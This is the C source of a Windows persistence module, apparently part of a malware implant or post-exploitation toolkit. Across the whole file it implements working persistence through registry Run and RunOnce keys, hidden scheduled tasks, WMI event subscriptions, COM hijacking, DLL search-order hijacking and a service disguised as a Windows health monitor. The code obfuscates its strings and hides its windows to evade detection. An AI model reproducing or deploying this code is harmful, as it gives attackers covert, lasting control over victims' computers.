/**
 * persistence.c - Persistence Module
 *
 * Implements various persistence mechanisms:
 * - Registry Run keys
 * - Scheduled tasks
 * - WMI event subscriptions
 * - COM hijacking
 * - DLL search order hijacking
 * - Service creation
 * - Startup folder
 */

#include <windows.h>
#include <shlobj.h>
#include <taskschd.h>
#include <stdio.h>
#include "../../include/config.h"
#include "../../include/obfuscate.h"
#include "../../include/postex.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "taskschd.lib")

/* ---- Registry Run Key ---- */
int persist_registry_run_impl(const char* name, const char* path, BOOL hklm) {
    HKEY hkey;
    const char* subkey = OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    HKEY root = hklm ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;

    LONG status = RegOpenKeyExA(root, subkey, 0, KEY_SET_VALUE, &hkey);
    if (status != ERROR_SUCCESS) return -1;

    status = RegSetValueExA(hkey, name, 0, REG_SZ,
                            (BYTE*)path, (DWORD)strlen(path) + 1);
    RegCloseKey(hkey);
    return status == ERROR_SUCCESS ? 0 : -1;
}

/* ---- Registry RunOnce Key ---- */
int persist_registry_runonce(const char* name, const char* path, BOOL hklm) {
    HKEY hkey;
    const char* subkey = OBF("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
    HKEY root = hklm ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;

    LONG status = RegOpenKeyExA(root, subkey, 0, KEY_SET_VALUE, &hkey);
    if (status != ERROR_SUCCESS) return -1;

    status = RegSetValueExA(hkey, name, 0, REG_SZ,
                            (BYTE*)path, (DWORD)strlen(path) + 1);
    RegCloseKey(hkey);
    return status == ERROR_SUCCESS ? 0 : -1;
}

/* ---- Scheduled Task ---- */
int persist_schtask_impl(const char* task_name, const char* executable,
                    const char* trigger_type) {
    char cmd[2048];

    if (strcmp(trigger_type, OBF("logon")) == 0) {
        snprintf(cmd, sizeof(cmd),
            OBF("schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest /f"),
            task_name, executable);
    } else if (strcmp(trigger_type, OBF("startup")) == 0) {
        snprintf(cmd, sizeof(cmd),
            OBF("schtasks /create /tn \"%s\" /tr \"%s\" /sc onstart /ru SYSTEM /f"),
            task_name, executable);
    } else if (strcmp(trigger_type, OBF("idle")) == 0) {
        snprintf(cmd, sizeof(cmd),
            OBF("schtasks /create /tn \"%s\" /tr \"%s\" /sc onidle /i 5 /f"),
            task_name, executable);
    } else {
        snprintf(cmd, sizeof(cmd),
            OBF("schtasks /create /tn \"%s\" /tr \"%s\" /sc daily /st 03:00 /f"),
            task_name, executable);
    }

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char exec_cmd[2200];
    snprintf(exec_cmd, sizeof(exec_cmd), OBF("cmd.exe /c %s"), cmd);

    if (CreateProcessA(NULL, exec_cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }
    return -1;
}

/* ---- WMI Event Subscription ---- */
int persist_wmi_event_impl(const char* name, const char* command, int interval_sec) {
    char ps_cmd[4096];
    const char *ps_prefix = OBF("powershell.exe -NoProfile -WindowStyle Hidden -c \"");
    snprintf(ps_cmd, sizeof(ps_cmd),
        "%s"
        "$filter = Set-WmiInstance -Namespace root\\subscription "
        "-Class __EventFilter -Arguments @{"
        "Name='%s_filter';"
        "EventNameSpace='root\\cimv2';"
        "QueryLanguage='WQL';"
        "Query='SELECT * FROM __InstanceModificationEvent WITHIN %d "
        "WHERE TargetInstance ISA \\\"Win32_PerfFormattedData_PerfOS_System\\\"'};"
        "$consumer = Set-WmiInstance -Namespace root\\subscription "
        "-Class CommandLineEventConsumer -Arguments @{"
        "Name='%s_consumer';"
        "CommandLineTemplate='%s'};"
        "$binding = Set-WmiInstance -Namespace root\\subscription "
        "-Class __FilterToConsumerBinding -Arguments @{"
        "Filter=$filter;"
        "Consumer=$consumer}\"",
        ps_prefix, name, interval_sec, name, command);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }
    return -1;
}

/* ---- COM Object Hijacking ---- */
int persist_com_hijack_impl(const char* clsid, const char* dll_path) {
    char subkey[512];
    HKEY hkey;

    // Write to HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32
    snprintf(subkey, sizeof(subkey),
        OBF("Software\\Classes\\CLSID\\%s\\InprocServer32"), clsid);

    LONG status = RegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL,
                                   REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                                   NULL, &hkey, NULL);
    if (status != ERROR_SUCCESS) return -1;

    // Set default value to our DLL
    status = RegSetValueExA(hkey, NULL, 0, REG_SZ,
                            (BYTE*)dll_path, (DWORD)strlen(dll_path) + 1);
    if (status == ERROR_SUCCESS) {
        // Set ThreadingModel
        const char* model = OBF("Both");
        RegSetValueExA(hkey, "ThreadingModel", 0, REG_SZ,
                       (BYTE*)model, (DWORD)strlen(model) + 1);
    }

    RegCloseKey(hkey);
    return status == ERROR_SUCCESS ? 0 : -1;
}

/* ---- DLL Search Order Hijack ---- */
int persist_dll_hijack_impl(const char* target_exe_dir, const char* dll_name,
                       const char* payload_dll_path) {
    // Copy our malicious DLL to the target directory with the expected name
    char dest_path[MAX_PATH];
    snprintf(dest_path, sizeof(dest_path), "%s\\%s", target_exe_dir, dll_name);

    if (CopyFileA(payload_dll_path, dest_path, FALSE)) {
        return 0;
    }
    return -1;
}

/* ---- Service Creation ---- */
int persist_service_impl(const char* service_name, const char* display_name,
                    const char* bin_path) {
    SC_HANDLE sc_mgr = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!sc_mgr) return -1;

    SC_HANDLE svc = CreateServiceA(sc_mgr, service_name, display_name,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
        bin_path, NULL, NULL, NULL, NULL, NULL);

    if (!svc) {
        CloseServiceHandle(sc_mgr);
        return -1;
    }

    // Set description
    SERVICE_DESCRIPTIONA desc;
    desc.lpDescription = OBF("Windows System Health Monitor Service");
    ChangeServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, &desc);

    // Set failure actions (restart on failure for resilience)
    SC_ACTION actions[3] = {
        { SC_ACTION_RESTART, 5000 },
        { SC_ACTION_RESTART, 10000 },
        { SC_ACTION_RESTART, 30000 },
    };
    SERVICE_FAILURE_ACTIONSA fa = {0};
    fa.dwResetPeriod = 86400;  // 1 day
    fa.cActions = 3;
    fa.lpsaActions = actions;
    ChangeServiceConfig2A(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);

    CloseServiceHandle(svc);
    CloseServiceHandle(sc_mgr);
    return 0;
}

/* ---- Startup Folder ---- */
int persist_startup_folder_impl(const char* payload_path, const char* link_name) {
    char startup_path[MAX_PATH];

    if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
        return -1;
    }

    char dest[MAX_PATH];
    snprintf(dest, sizeof(dest), "%s\\%s", startup_path, link_name);

    // Copy payload to startup folder
    if (CopyFileA(payload_path, dest, FALSE)) {
        return 0;
    }
    return -1;
}

/* ---- Remove Persistence ---- */
int persist_remove_registry(const char* name, BOOL hklm) {
    HKEY hkey;
    const char* subkey = OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    HKEY root = hklm ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;

    LONG status = RegOpenKeyExA(root, subkey, 0, KEY_SET_VALUE, &hkey);
    if (status != ERROR_SUCCESS) return -1;

    status = RegDeleteValueA(hkey, name);
    RegCloseKey(hkey);
    return status == ERROR_SUCCESS ? 0 : -1;
}

int persist_remove_service(const char* service_name) {
    SC_HANDLE sc_mgr = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!sc_mgr) return -1;

    SC_HANDLE svc = OpenServiceA(sc_mgr, service_name, SERVICE_ALL_ACCESS);
    if (!svc) {
        CloseServiceHandle(sc_mgr);
        return -1;
    }

    SERVICE_STATUS status;
    ControlService(svc, SERVICE_CONTROL_STOP, &status);
    BOOL result = DeleteService(svc);

    CloseServiceHandle(svc);
    CloseServiceHandle(sc_mgr);
    return result ? 0 : -1;
}

int persist_remove_schtask(const char* task_name) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), OBF("schtasks /delete /tn \"%s\" /f"), task_name);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char exec_cmd[1200];
    snprintf(exec_cmd, sizeof(exec_cmd), OBF("cmd.exe /c %s"), cmd);

    if (CreateProcessA(NULL, exec_cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }
    return -1;
}
